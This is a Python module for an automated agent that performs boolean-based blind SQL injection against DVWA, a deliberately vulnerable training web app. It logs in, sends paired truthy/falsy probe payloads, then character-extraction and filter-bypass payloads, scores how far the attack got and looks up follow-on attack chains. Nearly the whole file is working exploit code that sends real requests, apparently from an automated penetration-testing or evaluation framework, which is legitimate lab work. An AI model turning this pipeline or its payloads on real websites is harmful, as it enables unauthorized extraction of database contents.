"""SQLi Boolean-based blind injection agent with real HTTP execution."""

from __future__ import annotations

import logging
from typing import Any

from agents.agent_telemetry import exploit_event, probe_event, score_event
from agents.state_utils import already_tried_payloads, make_update, normalize_security_level
from core.knowledge_graph import AttackKnowledgeGraph
from core.state import ExploitationState, MODULE_TO_KG_NODE
from foundation.payload_library import PayloadLibrary
from foundation.session_manager import DVWASession
from foundation.verifier import Verifier

logger = logging.getLogger(__name__)

AGENT_ID = "sqli_boolean_blind"
MODULE_PATH = "/vulnerabilities/sqli_blind/"
_PROBE_OBSERVATION_KEY = "response_diff_detectable"

_TRUTHY_SIGNAL = "user id exists in the database"
_FALSY_SIGNAL = "user id is missing from the database"
_EXPLOIT_SIGNALS = ["user id exists", "exists in the database", "admin", "password"]


def _probe_preconditions(
    session: DVWASession, payloads: list[str], already_tried: set[str]
) -> tuple[bool, list[str], dict[str, bool], list[dict]]:
    """Send truthy/falsy payload pairs to detect boolean-blind signal difference.

    Returns (precondition_met, tried_payloads, observations, telemetry_events).
    """
    observations: dict[str, bool] = {}
    tried: list[str] = []
    events: list[dict] = []
    sent_any = False

    truthy_resp: str | None = None
    falsy_resp: str | None = None

    for payload in payloads:
        if payload in already_tried:
            continue
        sent_any = True
        tried.append(payload)
        try:
            resp = session.get(MODULE_PATH, params={"id": payload, "Submit": "Submit"})
            events.append(probe_event(AGENT_ID, payload, resp.status_code, True))
            lower_text = resp.text.lower()
            if "1=1" in payload:
                truthy_resp = lower_text
            elif "1=2" in payload:
                falsy_resp = lower_text
            # DVWA low: truthy shows "exists", falsy shows "missing"
            if _TRUTHY_SIGNAL in lower_text:
                truthy_resp = lower_text
            elif _FALSY_SIGNAL in lower_text:
                falsy_resp = lower_text
        except Exception as exc:
            logger.warning("[%s] PROBE request failed: %s", AGENT_ID, exc)
            events.append(probe_event(AGENT_ID, payload, None, False))

    # Detect difference between truthy and falsy responses
    if truthy_resp is not None and falsy_resp is not None:
        if truthy_resp != falsy_resp:
            observations[_PROBE_OBSERVATION_KEY] = True
            return True, tried, observations, events
        # Even if same text, check for length difference
        if abs(len(truthy_resp) - len(falsy_resp)) > 5:
            observations[_PROBE_OBSERVATION_KEY] = True
            return True, tried, observations, events

    if not sent_any:
        # Don't overwrite prior observation if we didn't send any requests
        return False, tried, {}, events
    observations[_PROBE_OBSERVATION_KEY] = False
    return False, tried, observations, events


def _attempt_exploit(
    session: DVWASession, payloads: list[str], already_tried: set[str]
) -> tuple[int, list[str], list[str], list[dict]]:
    """Try boolean-blind exploit payloads. Returns (score, tried, confirmed_vulns, events)."""
    tried: list[str] = []
    events: list[dict] = []
    confirmed: list[str] = []
    score = 0

    for payload in payloads:
        if payload in already_tried:
            continue
        tried.append(payload)
        try:
            resp = session.get(MODULE_PATH, params={"id": payload, "Submit": "Submit"})
            events.append(exploit_event(AGENT_ID, payload, resp.status_code, True))
            if resp.status_code == 200:
                lower_text = resp.text.lower()
                # Full exploit: boolean condition returned true (exists) for extraction payload
                if _TRUTHY_SIGNAL in lower_text:
                    score = max(score, 3)
                    confirmed.append(MODULE_TO_KG_NODE[AGENT_ID])
                    break
                # Partial: page renders without error
                if "user id" in lower_text:
                    score = max(score, 2)
        except Exception as exc:
            logger.warning("[%s] EXPLOIT request failed: %s", AGENT_ID, exc)
            events.append(exploit_event(AGENT_ID, payload, None, False))

    return score, tried, confirmed, events


def _chain_check(confirmed_node: str, state: ExploitationState) -> tuple[int, list[str]]:
    """Query AKG for chain edges. Returns (score, achieved_outcomes)."""
    achieved: list[str] = []
    score = 0
    kg = AttackKnowledgeGraph()
    confirmed_set = set(state.get("confirmed_vulns", [])) | {confirmed_node}

    for edge in kg.get_next_actions(confirmed_node):
        if not edge.get("is_chain"):
            continue
        preconditions = edge.get("preconditions", [])
        if all(p in confirmed_set for p in preconditions):
            achieved.append(edge["target"])
            score = 4

    return score, achieved


def sqli_boolean_blind_agent(state: ExploitationState) -> dict[str, Any]:
    """Run PROBE -> EXPLOIT -> CHAIN CHECK for sqli_boolean_blind."""
    target_url = state.get("target_url", "")
    security_level = normalize_security_level(state.get("security_level"))

    if not target_url:
        return make_update(state=state, module_name=AGENT_ID, score=0, tried_payloads=[])

    session = DVWASession(target_url)
    try:
        if not session.login():
            return make_update(state=state, module_name=AGENT_ID, score=0, tried_payloads=[])
        session.set_security_level(security_level)

        payload_lib = PayloadLibrary()
        payload_set = payload_lib.get(AGENT_ID, security_level)

        already_tried = already_tried_payloads(state, AGENT_ID)
        confirmed_vulns: list[str] = []
        achieved_outcomes: list[str] = []
        score = 0
        telemetry_events: list[dict[str, Any]] = []
        all_tried: list[str] = []
        observations: dict[str, bool] = {}

        # Stage 1: PROBE
        probe_payloads = list(payload_set.probe) or ["1' AND 1=1-- -", "1' AND 1=2-- -"]
        probe_ok, tried, probe_obs, probe_events = _probe_preconditions(
            session, probe_payloads, already_tried
        )
        all_tried.extend(tried)
        telemetry_events.extend(probe_events)
        observations.update(probe_obs)

        if not probe_ok:
            update = make_update(
                state=state, module_name=AGENT_ID, score=0,
                tried_payloads=all_tried, telemetry_events=telemetry_events,
            )
            update["observations"] = observations
            return update

        score = max(score, 1)

        # Stage 2: EXPLOIT
        exploit_payloads = list(payload_set.exploit) or [
            "1' AND ASCII(SUBSTR(database(),1,1))>77-- -"
        ]
        bypass_payloads = list(payload_set.bypass.get(security_level, []))
        all_exploit = exploit_payloads + bypass_payloads

        exploit_score, tried, confirmed, exploit_events = _attempt_exploit(
            session, all_exploit, already_tried | set(all_tried)
        )
        all_tried.extend(tried)
        telemetry_events.extend(exploit_events)
        score = max(score, exploit_score)
        confirmed_vulns.extend(confirmed)

        # Stage 3: CHAIN CHECK
        if confirmed_vulns:
            chain_score, chain_achieved = _chain_check(confirmed_vulns[0], state)
            if chain_score >= 4:
                score = max(score, chain_score)
                achieved_outcomes.extend(chain_achieved)

        telemetry_events.append(score_event(AGENT_ID, score, confirmed_vulns, achieved_outcomes))

        update = make_update(
            state=state, module_name=AGENT_ID, score=score,
            tried_payloads=all_tried,
            confirmed_vulns=confirmed_vulns or None,
            achieved_outcomes=achieved_outcomes or None,
            telemetry_events=telemetry_events,
        )
        update["observations"] = observations
        return update
    except Exception as exc:
        logger.warning("[%s] Session or execution failed: %s", AGENT_ID, exc)
        return make_update(
            state=state, module_name=AGENT_ID, score=0, tried_payloads=[],
            failure_agents=[AGENT_ID],
        )
    finally:
        session.close()
